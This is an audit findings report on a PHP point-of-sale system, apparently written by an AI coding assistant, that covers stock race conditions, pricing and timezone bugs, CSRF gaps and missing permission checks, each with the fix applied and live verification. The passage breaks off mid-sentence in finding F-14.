# Findings

Severity definitions: **Critical** = wrong money/stock numbers or a security hole. **High** = real
business-process or authorization gap without direct money loss proven. **Medium** = data-model gap
or inconsistency that degrades trust/reporting accuracy under specific conditions. **Low** = hardening/
robustness improvement, no evidence of actual harm yet.

Everything below was found by reading the code and, where marked **(reproduced)**, by running a real
script against a live copy of the database and observing the actual result.

> **Note on test-script location:** this report folder is named `AUDIT_REPORT/` rather than the
> originally-requested `AUDIT/` because on this Windows filesystem, `AUDIT/` and the app's existing
> `audit/` folder (the live Audit Log feature at `audit/index.php`) are the **same physical directory**
> (NTFS is case-insensitive) — writing to `AUDIT/` would have mixed report files into the live app
> folder and, worse, put executable PHP test scripts inside the public web root where they could be
> triggered by a bare URL with no authentication. The two reproduction scripts referenced below
> currently live outside the web root, in this session's scratchpad
> (`test-offer-price-mismatch.php`, `test-stocktake-race.php`). Tell me where you'd like them
> permanently — e.g. a differently-named in-repo folder such as `audit-tests/` (safe: no case
> collision with `audit/`) — and I'll move them there.

---

### RESOLVED (fixed in the working session immediately preceding this audit — verified, not re-opened)

These are listed for completeness because they map directly to invariants 1, 6, 7, 8 and were the
trigger for this audit. They are confirmed fixed and reconciled with real data; see `reconcile.sql`
queries 1–3 for the checks that would catch a regression.

- **R-01**: `reports/index.php`, `reports/export.php`, `dashboard/index.php`, `sales/export.php`,
  `exhibitions/index.php`, `exhibitions/export.php`, `exhibitions/print.php` all classified every sale
  as strictly `completed` XOR `returned`, so a `partial_return` invoice fell into neither bucket and
  was silently excluded from revenue. Fixed by computing `returned_amount` per sale directly from
  `SUM(returns.total)` and using `total − returned_amount` as net, everywhere, regardless of status.
- **R-02**: `sales/cancel.php` (and its offline-sync twin) restored stock on a full cancellation but
  never wrote a `returns`/`return_items` row, so cancelled invoices were invisible to the returns
  total computed in R-01's fix. Fixed by unifying `cancel.php`, `return.php`, and
  `sync_offline_actions.php` onto one shared `processReturn()` function in `config.php`.

---

### F-00 — Critical — Stocktake silently discards concurrent stock changes (blind absolute overwrite of a stale value) — ✅ FIXED

> **Fix applied:** `inventory/stocktake.php` now computes `countedDelta = physicalCount − system_qty_from_sheet`
> (the discrepancy the stock-taker actually found, independent of anything else), then re-reads the
> live `stock_qty` inside the transaction with `SELECT ... FOR UPDATE` and applies the delta on top of
> *that* value (`newQty = liveQty + countedDelta`), instead of overwriting absolutely with the stale
> form value. Ported to `store2/inventory/stocktake.php` (brand-agnostic file, copied as-is).
>
> **Verified two ways:** (1) the standalone reproduction script, updated to simulate the fixed
> algorithm, now asserts and passes on the correct result (20 → −3 concurrent sale → −2 counted
> shrinkage → 15, not 18). (2) A real end-to-end test against the actual live file: seeded a test
> product at 20, ran a genuine concurrent `UPDATE` (simulating another till) to 17, then issued a real
> HTTP POST to `inventory/stocktake.php` with the stale `system_qty=20` and `actual_qty=18` exactly as
> the real form would send them — the live database ended at **15.00**, and the movement log correctly
> recorded both the original sale and the adjustment.
>
> **Self-caught bug in the fix itself, corrected before shipping:** the first version of the audit-log
> note string interpolated `$liveQty` immediately followed by an Arabic comma (`،`) with no separator —
> PHP's variable-name tokenizer treats bytes `\x80–\xff` as valid identifier characters, so the comma's
> UTF-8 bytes were silently absorbed into the variable name, resolving to an undefined variable (empty
> string, suppressed by this app's `error_reporting(0)`). The stock math itself was unaffected (proven
> by the live test above showing the correct `15.00`), but the logged note text was blank where the
> live-stock value should have appeared. Fixed by using explicit `{$liveQty}` delimiter syntax, then
> re-verified live: the note now reads correctly
> ("...الرصيد الحي وقت الحفظ: 17.00، الرصيد الجديد: 15"). Flagging this because you asked for zero
> tolerance on mistakes — better to show you a bug I introduced and fixed within the same turn than to
> not mention it.

**Original finding (for reference):**

**Invariant broken:** #4 (stored `stock_qty` must always reconcile with the movement log).
**Files:** `inventory/stocktake.php:9-46`.

`system_qty` (the baseline used to decide whether an adjustment is needed at all, and what diff to log)
is read from a **hidden form field rendered at page-load time**, not re-queried from the database when
the form is submitted. Any sale, return, receipt, or transfer that happens on that product between the
moment the stock-taker opens the page and the moment they submit their count is silently discarded: the
final `stock_qty` becomes whatever they physically counted, full stop, with no attempt to reconcile it
against what should have happened to stock in the meantime.

**Reproduction (actually run, see `test-stocktake-race.php`, currently in the session scratchpad — see note above):**
- Test product starts at `stock_qty = 20` (this is what the stocktake page would show/embed at page-load).
- A real, independent sale of 3 units happens (correctly brings true stock to 17).
- Stock-taker (unaware of the sale, going purely off what they observe on the shelf) genuinely finds 2
  units broken/missing and submits a physical count of 18, computed against the stale baseline of 20
  (diff = -2).
- The real code path performs `UPDATE products SET stock_qty = 18` — an **absolute** overwrite.
- Final `stock_qty` = **18**. Correct value (20 − 3 sold − 2 broken) = **15**. The 3-unit sale's effect
  on stock has been silently erased, even though the sale, its invoice, and its `inventory_movements`
  "sale" row are all still sitting in the database, now permanently disagreeing with `stock_qty`.

**Expected:** a stocktake adjustment should be computed as a **relative delta** applied on top of the
live value at submit time (`stock_qty = stock_qty + (physical_count − system_qty_at_submit_time)`), or
the whole batch should be submitted inside a single transaction that re-reads live stock immediately
before writing, not trust a value that may be stale by minutes or hours.

**Proposed fix (do not implement yet):** re-fetch each product/variant's current `stock_qty` inside the
same transaction that performs the update (`SELECT ... FOR UPDATE` per row, matching the pattern already
used correctly in `pos/save_sale.php`), compute the adjustment relative to that live value, not the
value the browser has been holding onto since page load.

---

### F-01 — Critical — Campaign offer price is not what actually gets charged — ✅ FIXED

> **Correction to this finding before describing the fix:** the original write-up claimed
> `pos/sync_offline.php` has "identical logic" to `save_sale.php`. On closer reading while implementing
> the fix, that's **wrong** — `sync_offline.php` reads `unit_price` directly from the client
> (`floatval($item['unit_price'] ?? 0)`), it does not recompute from `offer_price` at all. This is
> architecturally correct behavior for that file, not a duplicate of this bug: an offline sale already
> happened in the past, at whatever price the cashier's app showed at that moment using its locally
> cached offer data — recomputing the price at *sync* time against the server's *current* offers would
> be wrong, since an offer that was active during the actual sale may have since expired (or a new one
> started), which would silently change the price of a transaction that's already completed and paid
> for. So **`sync_offline.php` was deliberately left unchanged.** Separately, this did surface a real
> but different concern worth your attention later: `sync_offline.php` has no sanity bound at all on
> the client-submitted `unit_price` for offline sales (it could in principle receive any number). Not
> fixing this now since it wasn't in the approved list and needs a design decision (e.g., a tolerance
> check against retail price) — flagging it as a new candidate finding for you to prioritize, not
> silently changing behavior for a file outside today's scope.
>
> **Fix applied (to `pos/save_sale.php` only, per your decision — lowest of campaign vs. static wins,
> never stacked):** the item-processing loop now calls `getActiveOffers()` once up front, and for each
> line where `price_type === 'offer'`, computes both `computeOfferPrice()` (campaign) and the static
> `offer_price` column, and charges `min()` of whichever of the two actually apply (falls back to the
> single one if only one exists, to full retail if neither exists). Ported to
> `store2/pos/save_sale.php` (brand-agnostic file, copied as-is).
>
> **Verified live, three scenarios, via real HTTP POSTs to the actual endpoint:**
> | Scenario | Retail | Campaign (30% off) | Static | Expected (lowest) | Actually charged |
> |---|---|---|---|---|---|
> | No static offer | 200 | 140 | — | 140 | **140.00** ✅ |
> | Static higher than campaign | 200 | 140 | 150 | 140 | **140.00** ✅ |
> | Static lower than campaign | 200 | 140 | 120 | 120 | **120.00** ✅ |

**Original finding (for reference):**

**Invariant broken:** #10 (price applied must be the one valid at moment of sale).
**Files:** `pos/save_sale.php:84-88` (fixed), `offers/index.php` (never writes to `products.offer_price` — unchanged, this is fine, see below).

**Root cause:** There are two entirely independent "offer" mechanisms:
1. The `offers` table — time-boxed campaigns (start/end date, category/product targeting), evaluated
   live by `getActiveOffers()` + `computeOfferPrice()`. This is what `pos/search_product.php` uses to
   decide the offer price **shown to the cashier** in the POS product grid.
2. A static `offer_price` column directly on `products`/`product_variants`, set manually per-product
   via the product edit form. This is the **only** thing `save_sale.php` reads when the cashier selects
   "عرض" (Offer) for a line item — it never calls `computeOfferPrice()` or looks at the `offers` table
   at the moment of charging.

If a product's price only qualifies for a discount because of an active campaign (mechanism 1) and has
no static `offer_price` set (mechanism 2, which is the common case — nothing in the offers UI sets it),
the cashier sees and quotes the discounted price, but the invoice is saved at **full retail price**.

**Reproduction (actually run, see `test-offer-price-mismatch.php`, currently in the session scratchpad — see note above):**
- Product "شنطة القهوة الكاملة", retail price AED 265.00, static `offer_price` = NULL.
- Created a real 20%-off, all-products, active-today campaign in `offers`.
- `computeOfferPrice()` (what the cashier's screen shows) → **AED 212.00**.
- The exact price-resolution code from `save_sale.php`, run against the same data → **AED 265.00**.
- Result: **AED 53.00 discrepancy per unit**, invoice recorded at full price while the customer was
  quoted/shown the discounted one.

**Expected:** the amount saved to `sale_items.unit_price` when `price_type='offer'` must equal
`computeOfferPrice()`'s result (or the static `offer_price` if that's higher-priority by design —
business decision needed, see open question below), evaluated server-side at the moment of sale, not
trusted from the client and not sourced from a column the offers system never writes to.

**Proposed fix (do not implement yet):** in `save_sale.php` and `sync_offline.php`, when
`price_type === 'offer'`, call `getActiveOffers()`/`computeOfferPrice()` server-side (the same function
already used by `search_product.php`) to get the authoritative offer price, falling back to the static
`offer_price` column only if no active campaign applies. This also closes the same gap for the offline
sync path. **Open business question:** if both a campaign and a static per-product offer price are
present simultaneously, which should win? Needs your decision before Phase 4.

---

### F-02 — Critical — No timezone is configured; PHP and MySQL clocks disagree by 9 hours on this machine, neither is UAE time

**Invariant broken:** #15 (new), affects #1, #7, #9, #10 indirectly (every date-bounded calculation).
**Files:** entire codebase — no `date_default_timezone_set()` call exists anywhere; MySQL session `time_zone` is `SYSTEM`.

**Reproduction (actually run):**
```
PHP date_default_timezone_get() → Europe/Berlin   (PHP now: 2026-09-23 09:50:07)
MySQL NOW()                     → 2026-09-23 00:50:07
```
Two clocks, same machine, 9 hours apart, neither is Gulf Standard Time (UTC+4). On the production
InfinityFree host this exact 9-hour gap won't reproduce (different server config), but the underlying
defect — nothing in the app ever pins either clock to UAE time — is identical, and shared hosting
defaults are very commonly UTC, not UAE.

**Concrete impact:**
- `sales.created_at` is stamped by MySQL's clock (`DEFAULT current_timestamp()`).
- `nextInvoiceNumber()` builds the invoice number's date component from **PHP's** `date('ymd')`.
- Every "today"/"this week"/"this month" filter in the dashboard and reports uses MySQL's `CURDATE()`/
  `YEARWEEK()` — i.e., MySQL's clock, not UAE local time.
- Offer `start_date`/`end_date` are compared against `CURDATE()` — same exposure.
- A sale made late at night UAE time can be misfiled into the wrong calendar day on the dashboard, and
  the date embedded in its own invoice number can disagree with the date MySQL recorded it under.

**Expected:** one single, explicit UAE time source of truth used consistently by both PHP and MySQL for
every date/time value that reaches an invoice, a report filter, or an offer boundary.

**Proposed fix:** `date_default_timezone_set('Asia/Dubai')` in `config.php` (UAE has no DST, so this is
safe year-round), and `$pdo->exec("SET time_zone = '+04:00'")` right after connecting, so both engines
agree. Re-verify invoice numbering and every date filter after the change.

---

### F-03 — High — Offline sale is stamped with sync time, not the original sale time — ✅ FIXED

> **Fix applied:** `pos/sync_offline.php` now parses the client-sent `created_at` and, only if it's
> plausible (not more than 5 minutes in the future, not older than 90 days), inserts it explicitly
> into `sales.created_at`; otherwise the column is left to its normal `current_timestamp()` default
> (sync time), so a corrupt/missing client timestamp degrades gracefully instead of crashing or
> storing garbage. Both the raw client value and which value was actually used are recorded in the
> audit log for traceability. Ported to `store2/pos/sync_offline.php`.
>
> **Verified live, two scenarios:** (1) sent a real offline sale with `created_at` 4 hours in the
> past — `sales.created_at` reflected the earlier time, not the sync moment. (2) sent one with
> `created_at` 10 days in the future (implausible) — correctly fell back to the normal sync-time
> default instead of storing the bogus future date.

**Original finding (for reference):**

**Invariant broken:** #9 (correct original timestamp for synced offline invoices).
**Files:** `pos/sync_offline.php:120-128` (INSERT into `sales` has no `created_at` column — the column defaults to `current_timestamp()`, i.e. sync time). The original client-side timestamp (`$sale['created_at']`) is read into `$offlineCreated` and used *only* inside the audit-log payload, never inserted into `sales.created_at`.

**Concrete impact:** a sale physically made at 2pm, synced when Wi-Fi returns at 6pm, is recorded and
reported as a 6pm sale — wrong hour on the dashboard's hourly breakdown, and if it's synced after
midnight, it lands on the wrong calendar day entirely (compounds with F-02).

**Proposed fix:** insert `$offlineCreated` into `sales.created_at` explicitly when present and
plausible (not in the future, not absurdly old), keep the audit-log record of both times for
traceability.

---

### F-04 — Critical — Cost price shown/exported without checking the `view_cost` permission — ✅ FIXED

> **Fix applied:** cost-price input fields in `products/create.php` and `products/edit.php`, and the
> cost-price + cost-derived "total inventory value" columns in `products/export.php`, are now wrapped
> in `if (hasPermission('view_cost')): ... endif;`. Server-side, a submitted `cost_price` is silently
> ignored unless the submitter has `view_cost` — on **create**, it's simply not set (fine, nothing to
> preserve); on **edit**, the existing stored `cost_price` is explicitly preserved rather than nulled
> out, so a non-privileged user editing an unrelated field (e.g. the name) can't accidentally wipe the
> cost price for everyone else just because their form didn't include the hidden field. Same fix
> applied to per-variant cost handling in both files. Ported to `store2/products/{create,edit,export}.php`.
>
> **Verified live** with a real non-admin account (`accountant` role + `manage_products` permission,
> deliberately without `view_cost`) against a real product with `cost_price = 85.00`:
> - `edit.php`: no `cost_price` input field in the rendered HTML at all, no occurrence of "85" or
>   "التكلفة" (cost) anywhere on the page.
> - Submitted a real edit changing only the product name → `cost_price` in the database is **still
>   85.00** afterward (confirmed not nulled).
> - `export.php`: no "سعر التكلفة" or "إجمالي قيمة المخزون" column header in the output at all for
>   this user (an unrelated "85.00" did appear elsewhere in the export from a different, real product
>   whose retail price happens to be 85 — checked the actual row for this test product specifically
>   and confirmed no cost data present in it).
> - Regression check: logged in as an actual admin account and confirmed the cost field is still shown
>   and editable, value `85.00` displayed correctly — the permission gate doesn't affect privileged users.

**Original finding (for reference):**

**Invariant broken:** #11 (cost price never exposed to unauthorized roles).
**Files:** `products/create.php` (form field + response), `products/edit.php` (form field + response), `products/export.php:86,95` (Excel export column).

The custom-permission system has a dedicated `view_cost` permission for exactly this purpose (it's
already defined in `getAvailablePermissions()` and used correctly nowhere for products). All three
files above are gated only by `requireAccess([...], 'manage_products')` — meaning anyone granted
"add/edit products" (e.g., an accountant, per the exact example used to justify building the
permissions system this session) also unconditionally sees and can export cost price, even without
`view_cost`. `products/index.php` (the listing) currently doesn't show cost at all to anyone, admin
included — a separate, lower-priority feature gap, not a leak.

**Expected:** cost price field/column only rendered when `hasPermission('view_cost')` is true (admin
always true per existing `hasPermission()` semantics).

**Proposed fix:** wrap the cost-price `<input>` and its label in `create.php`/`edit.php`, and the
cost-price column in `export.php`, in `if (hasPermission('view_cost')): ... endif;`. On `edit.php`'s
POST handler, ignore any submitted `cost_price` if the submitter lacks `view_cost` (otherwise a
determined non-privileged user could still infer/overwrite it via a raw request).

---

### F-05 — Medium — No CSRF protection anywhere — ✅ FIXED

> **Fix applied:** added `csrfToken()`/`csrfField()`/`verifyCsrf()` to `config.php`, exactly as
> proposed. Every traditional `<form method="POST">` in the app now emits `csrfField()` and every
> POST handler calls `verifyCsrf()` before doing anything — 20 files total (products, users,
> inventory, exhibitions, offers, sales, auth/login.php, and the JSON/fetch endpoints
> `save_sale.php`/`sync_offline.php`/`sync_offline_actions.php`). Two pre-existing GET-based mutation
> links (category delete, offer toggle, exhibition-expense delete) got the same token as a query
> param instead, rather than a rewrite to POST.
>
> For fetch()/AJAX calls, a small monkey-patch in `assets/js/app.js` automatically attaches the
> token as an `X-CSRF-Token` header to every same-origin non-GET `fetch()` call, so no individual
> call site in the app needed editing. The offline Service Worker's own background-sync fetches
> (`sw.js`, outside the page's JS context, so unaffected by that patch) get the token via a
> `postMessage` sent from the page on every load; a missing/stale token there fails soft (offline
> sale stays queued in IndexedDB and retries later, never silently dropped).
>
> **Self-caught deployment bug, fixed before calling this done:** `assets/js/app.js` was served
> with no cache-busting query string, so the browser's own HTTP cache kept serving the pre-fix file
> to already-open tabs — meaning the new header patch silently never loaded and every POST would
> have started failing CSRF checks after deploy. Fixed by giving it the same `?v=<?= filemtime() ?>`
> versioning `app.css` already had (`includes/footer.php`).
>
> **Verified live:** real form submission with a valid token succeeds normally; same form with a
> forged/wrong token (via raw XHR, bypassing the JS patch) is rejected with a friendly error; a
> naked GET-based delete link with no token is rejected; the real link (with its embedded token)
> works; `save_sale.php`/`cancel.php` accept requests with the header attached and reject a
> deliberately wrong header value. All ported to store2 (own `config.php` additions — it doesn't
> share store's file — plus the same 20 endpoint files, `header.php`, `footer.php`, `app.js`, and
> `sw.js`, keeping store2's own hardcoded `/store2/` paths intact).

**Original finding (for reference):**

**Invariant:** general security hardening (not in the client's numbered list, added per audit scope).
**Files:** every POST-handling endpoint (`sales/cancel.php`, `sales/return.php`, `products/create.php`, `users/create.php`, `inventory/*.php`, etc.)

No CSRF token is generated or checked anywhere in the codebase (confirmed by full-text search).
Protection currently relies entirely on the session cookie's `SameSite=Lax` attribute, which blocks
most but not all cross-site POST forgery vectors and offers no defense if a browser doesn't honor it.

**Proposed fix:** a single shared CSRF token stored in session, emitted as a hidden field in every
form and validated in every POST/`$_SERVER['REQUEST_METHOD'] === 'POST'` handler — mechanical, but
touches every mutating endpoint, so best done as one dedicated pass in Phase 4 with a shared helper
(`csrfField()` / `verifyCsrf()`) rather than per-file ad hoc.

---

### F-06 — Medium — Receiving new stock never updates the product's cost price — ✅ FIXED

> **Fix applied (per your decision — weighted average, not overwrite):** added
> `computeWeightedAverageCost(existingQty, existingCost, receivedQty, receivedCost)` to `config.php`.
> `inventory/receive.php` (already rewritten this session for multi-product receiving) now locks and
> reads each product/variant's live `stock_qty`/`cost_price` inside the transaction and, whenever a
> cost is entered for that line, updates `cost_price` to the weighted average in the same `UPDATE` as
> the stock increment. If the product never had a cost recorded before (`NULL`), there's nothing to
> average against, so it just adopts the new batch's cost directly. Ported to `store2/inventory/receive.php`
> and `store2/config.php`.
>
> **Verified live, two scenarios:** existing stock 6 @ AED 237, received 4 @ AED 250 →
> `cost_price` became **242.20** (exact weighted average, `(6×237+4×250)/10`). Existing stock 3 with
> `cost_price = NULL`, received 2 @ AED 50 → `cost_price` became **50.00** exactly (not blended with
> a false zero).

**Original finding (for reference):**

**Invariant broken:** related to #4/#7 profit accuracy (not explicitly numbered by the client, but affects COGS in every exhibition/profit report).
**Files:** `inventory/receive.php:16,38` — `$costPrice` is captured and written to `inventory_movements.cost_price` (a historical log entry) but never to `products.cost_price` / `product_variants.cost_price`.

**Concrete impact:** if a supplier's price changes and staff record the new cost while receiving stock,
every profit/COGS calculation elsewhere in the app keeps using the old, stale `products.cost_price`
until someone manually edits the product — margins silently wrong until then.

**Open business question:** should receiving stock at a new cost overwrite the product's cost price
outright (simple, but loses weighted-average cost across batches), or should the system move to a
proper weighted-average cost calculation? Needs your decision before Phase 4 — the "just overwrite"
version is a small, low-risk fix; true weighted-average costing is a larger change.

---

### F-07 — Medium — Exhibition COGS uses today's cost price, not the cost price at time of sale — ✅ FIXED

> **Fix applied:** added a nullable `sale_items.cost_price` column (schema change, applied to both
> `store_pos_db` and `store2_pos_db`). `pos/save_sale.php` and `pos/sync_offline.php` now snapshot
> the resolved product/variant `cost_price` into that column at the moment each sale item is
> inserted. `exhibitions/index.php`, `export.php`, and `print.php` now compute COGS as
> `COALESCE(si.cost_price, pv.cost_price, p.cost_price, 0)` — preferring the snapshot, falling back
> to today's live cost only for historical rows saved before this fix (unavoidable — those rows
> never captured a snapshot). Ported to store2.
>
> **Verified live:** sold a product with `cost_price = 237` (snapshot correctly captured `237.00` on
> the `sale_items` row), then changed the product's live `cost_price` to `999`, then re-ran the exact
> COGS query the exhibitions report uses — it still returned `237.00`, proving a later cost edit no
> longer retroactively changes a historical sale's recorded cost.
>
> **Bonus fix found while verifying this one:** `exhibitions/print.php` and `reports/index.php` had
> a hardcoded `<img src=".../dahana.jpg">` logo instead of using `getActiveBrandInfo()` like every
> other invoice/report template — meaning store2 (Adventure)'s printed exhibition report and P&L
> report were silently showing Dahana's logo. Fixed to use `$brandInfo['logo']` dynamically in both
> files; verified live on store2 that both now correctly show `adventure.jpg` / "Adventure".

**Original finding (for reference):**

**Invariant:** relates to #10's spirit (historical figures shouldn't drift) applied to cost instead of price.
**Files:** `exhibitions/index.php`, `export.php`, `print.php` — COGS computed as `net_qty_sold × COALESCE(pv.cost_price, p.cost_price, 0)`, i.e. the product's **current** cost price, not what it cost at the time each historical sale happened (`sale_items` doesn't snapshot cost the way it snapshots price).

**Concrete impact:** editing a product's cost price today retroactively changes the calculated profit
of exhibitions that happened months ago, even though nothing about those historical sales changed.

**Proposed fix:** requires snapshotting `cost_price` onto `sale_items` at sale time (schema change) if
true historical accuracy is wanted — flagged as an open question for you, since it's a real schema
change, not a one-line fix, and depends on the F-06 decision (average vs. latest cost) too.

---

### F-08 — Medium (data-model gap, not a bug) — Refund payment method isn't tracked — ✅ FIXED

> **Fix applied:** added a nullable `returns.refund_method` (`cash`/`card`/`transfer`) column, schema
> change on both databases. `processReturn()` in `config.php` accepts and stores it.
> `sales/return.php`'s form now has a real dropdown (defaults to the original sale's payment method,
> but the operator can pick a different one), and rejects the submission if nothing's selected.
> `sales/cancel.php` and `sales/sync_offline_actions.php` (no dedicated UI) default to the sale's own
> payment method automatically, or `NULL` if the original sale was `mixed` payment (no single method
> to assume). `dashboard/index.php`'s cash/card/transfer KPI cards and `reports/index.php`'s P&L now
> net actual refunds out of the correct payment-method total instead of only showing gross collected.
> Ported to store2.
>
> **Verified live, full round trip:** sold an item for AED 265 via **card**, refunded it choosing
> **cash** (deliberately different from the original method) — `returns.refund_method` stored
> correctly as `'cash'`, and the live dashboard KPIs showed **cash: −265.00** (money that physically
> left the drawer) and **card: 265.00** (correctly untouched, since card was never actually
> refunded) — exactly the reconciliation signal this finding asked for.

**Original finding (for reference):**

**Invariant broken:** #7's second half ("refund method must be tracked").
**Files:** `returns` table has no payment-method column.

The P&L report shows cash/card/transfer at their original, pre-return amounts, with total returns
shown only as one aggregate deduction line — it does not (and currently cannot) show "of the AED 253
returned, AED 200 was refunded to card and AED 53 in cash." This is accurate as far as it goes (the
totals still reconcile), just less granular than invariant #7 asks for.

**Proposed fix:** add a `refund_method` column to `returns`, collected in the return UI, and net it out
of the per-method totals in the reports. This is a real feature addition, not a one-line fix — flagging
for your prioritization rather than assuming you want it before the exhibition deadline.

---

### F-09 — Low — Barcode uniqueness is enforced only in application code

**Invariant:** general data-integrity hardening.
**Files:** schema (`products.barcode`, `product_variants.barcode` are plain `KEY`, not `UNIQUE`); `barcodeExists()` in `config.php` is correctly called from both `create.php` and `edit.php`.

Two simultaneous "add product" submissions with the same barcode could both pass the `barcodeExists()`
check before either commits (classic check-then-insert race). Low likelihood in a small-staff retail
setting, but cheap to close.

**Proposed fix:** add a `UNIQUE` index on `barcode` in both tables (nullable-safe in MySQL — multiple
NULLs are allowed under a unique index), and catch the resulting duplicate-key exception with a
friendly error message as a defense-in-depth backstop behind the existing check.

---

### F-10 — Low / informational — Transfers don't validate against a per-location balance

**Invariant:** #5 (transfers never change total stock) — **this invariant holds**; this is a separate limitation, not a violation.
**Files:** `inventory/transfer.php`.

The schema tracks one `stock_qty` per product/variant, not a separate warehouse/showroom balance, so
`transfer.php` is (correctly, per its own code comment) a pure log entry that never changes total
stock. The side effect is that the "from" location dropdown accepts any quantity with no check that the
source location actually holds that much — because there's no queryable per-location number to check
against. If the client wants a genuine "how much is in the warehouse right now" figure, that requires
a schema change (either two stock columns, or deriving current per-location balance by replaying the
`transfer_in`/`transfer_out` movement log — note `transfer_in` is defined in the enum but **never
actually written** by any code path, only `transfer_out`, which would make replay-based derivation
wrong today even if attempted). Flagging as a question: does the client actually need live
per-location stock visibility, or is this log-only behavior sufficient? This determines whether it's
in scope for Phase 4 at all.

---

### F-11 — Low — Product edit audit log omits cost price from the "new" snapshot

**Invariant:** #12.
**Files:** `products/edit.php:148-153` — `logAudit()`'s "new" array includes `retail_price`, `offer_price`, `wholesale_price` but not `cost_price`, even though the "old" snapshot (`$product`, the full prior row) does contain it. A cost-price-only edit is under-documented in the audit trail.

**Proposed fix:** add `'cost_price' => $costPrice` to the "new" array.

---

### F-12 — Critical — Discount amount is trusted from the client with no server-side permission check — ✅ FIXED

> **Fix applied:** `pos/save_sale.php` now rejects the sale outright (same pattern as `void_invoice`
> in `cancel.php`/`return.php`) if `discount > 0` and the session's role isn't admin/accountant and
> lacks `apply_discount` — nothing is written to the database in that case. `pos/sync_offline.php`
> handles this differently and deliberately: an offline sale already happened and was already paid at
> the (possibly discounted) amount before it ever reaches this endpoint, so rejecting the sync would
> mean losing an already-completed, already-collected transaction — the exact same principle this file
> already applies to oversold stock. So instead of rejecting, it now honors the sale as recorded but
> adds `unauthorized_discount: true/false` to that sale's audit-log entry, so it surfaces for admin
> review instead of being silently invisible. Ported to `store2/pos/{save_sale,sync_offline}.php`.
>
> **Self-caught bug found while testing the fix, corrected before shipping:** `save_sale.php`'s
> `catch (Exception $e)` block called `$pdo->rollBack()` **unconditionally**, with no
> `if ($pdo->inTransaction())` guard (unlike `cancel.php`/`return.php`, which do have it). This was a
> latent, pre-existing bug that had never been triggered before, because every prior exception in this
> file was thrown *after* `beginTransaction()`. My new discount check is deliberately the first thing
> checked, *before* the transaction starts (so a rejected discount never touches the database at all)
> — which meant the first real test of it threw `PDOException: There is no active transaction` from
> inside the catch block itself, an uncaught fatal error, HTTP 500 with an empty body. Fixed by adding
> the same `if ($pdo->inTransaction())` guard already used correctly elsewhere. Flagging this per your
> zero-tolerance instruction, same as F-00's self-caught bug.
>
> **Verified live, three scenarios:**
> - Cashier without `apply_discount` submits `discount: 50` to `save_sale.php` → **rejected** with a
>   clear Arabic error, confirmed zero rows written (`sales` count for that discount = 0, stock
>   untouched at 20).
> - Cashier *with* `apply_discount` submits the same request → **succeeds**, total correctly reduced
>   by the discount (invoice total = 50 on a 100 AED item).
> - Same unauthorized cashier submits an **offline** sale via `sync_offline.php` with a discount →
>   **synced successfully** (not rejected, per the design reasoning above), and its audit-log entry
>   correctly shows `"unauthorized_discount":true`, while an equivalent sync from an authorized user
>   shows `"unauthorized_discount":false` — confirmed both in the same test run, side by side.

**Original finding (for reference):**

**Invariant broken:** #12 in spirit (every discount change should be authorized, not just logged), and the general principle "authorization checks on every endpoint, not just hidden buttons" from the audit brief.
**Files:** `pos/save_sale.php:24,110` and `pos/sync_offline.php:49,118` — `$discount = floatval($input['discount'] ?? 0)` is read directly from the POST body and applied to `$finalTotal` with **no check against the `apply_discount` custom permission** anywhere in either file.

The `apply_discount` permission exists and is presumably used to hide the discount UI field in the POS
for cashiers who shouldn't have it — but that's a UI convenience only. Any authenticated cashier or
admin session can submit a crafted request directly to `save_sale.php` with any `discount` value and
it will be accepted and saved, regardless of whether that session's user has `apply_discount`.

**Reproduction:** code inspection is conclusive here — the variable is read from `$input` and used with
no intervening permission check anywhere between read and use; no live repro needed to prove absence
of a check, but can be demonstrated with a raw POST if you want it for the record.

**Proposed fix:** in both files, if `discount > 0`, require
`in_array($_SESSION['user_role'], ['admin','accountant']) || hasPermission('apply_discount')`,
mirroring the exact pattern already used for `void_invoice` in `cancel.php`/`return.php`. Reject or
zero the discount otherwise.

---

### F-13 — High — Any cashier can view/print any invoice by changing the URL, not just their own — ✅ FIXED

> **Fix applied (per your decision — cashiers see only their own invoices, managers/accountants see
> all):** `sales/invoice.php` now checks `$sale['cashier_id']` against the session user for anyone
> not admin/accountant, matching the exact pattern already used in `return.php`/`cancel.php`/
> `get_sale_json.php`. Ported to `store2/sales/invoice.php`.
>
> **Verified live with three real accounts:** a cashier who owns the invoice → allowed; a different
> cashier → blocked with "غير مصرح لك بعرض هذه الفاتورة"; admin → allowed regardless of owner.

**Original finding (for reference):**

**Invariant broken:** #16 (new) — consistency with the ownership rule already enforced for cancel/return/get_sale_json.
**Files:** `sales/invoice.php:1-19` — `requireAuth(['admin','cashier','accountant'])` only; no comparison between `$sale['cashier_id']` and `$_SESSION['user_id']` for non-admin/accountant roles, unlike `sales/return.php`, `sales/cancel.php`, and `sales/get_sale_json.php`, which all enforce "a cashier can only act on their own invoices."

**Concrete impact:** a cashier can enumerate `?id=1`, `?id=2`, ... and view/print every invoice in the
system, including other cashiers' and the customer names/phone numbers on them — a privacy/business-
process inconsistency, not a direct money bug (the invoice template does not display cost price).

**Proposed fix:** add the same ownership check used in the other three files:
`if (!in_array($role, ['admin','accountant']) && (int)$sale['cashier_id'] !== (int)$_SESSION['user_id']) { 403 }`.
Confirm with you first whether this is actually wanted — some businesses deliberately let any cashier
reprint any invoice for a walk-up customer who lost their receipt, in which case this is by design and
should be documented as such rather than "fixed."

---

### F-14 — Medium — Wholesale pricing is appliable by any cashier with no distinct authorization — ✅ FIXED

> **Fix applied (per your decision — needs its own permission):** added `apply_wholesale_price` to
> `getAvailablePermissions()`. `pos/save_sale.php` now rejects the entire sale (nothing written) if
> any line requests wholesale pricing and the session isn't admin/accountant and lacks the new
> permission — mirrors F-12's discount check exactly. `pos/sync_offline.php` flags (doesn't reject,
> same already-collected-money principle as F-12) unauthorized wholesale lines in the audit log
> instead. The POS screen itself (`pos/index.php`) now also hides the "جملة" price-type option from
> the dropdown, and disables the discount input, for sessions without the matching permission — so
> an unauthorized cashier never even sees a control that would just get rejected on submit.
> Ported to store2.
>
> **Verified live, three cases:** unauthorized cashier — the wholesale option doesn't render in the
> POS UI, and a forged direct request to `save_sale.php` is rejected with a clear error, zero rows
> written. Authorized admin — same request succeeds and correctly charges the wholesale price
> (AED 100, not retail 265).

**Original finding (for reference):**

**Invariant:** general authorization completeness, parallel to F-12.
**Files:** `pos/save_sale.php:74,86-87`, `pos/sync_offline.php` (same) — `price_type === 'wholesale'` is accepted from any authenticated POS session with zero permission gate, unlike the discount field which at least has a permission defined for it (even if unenforced server-side, per F-12).

**Concrete impact:** any cashier can sell any item at wholesale price to a walk-in retail customer,
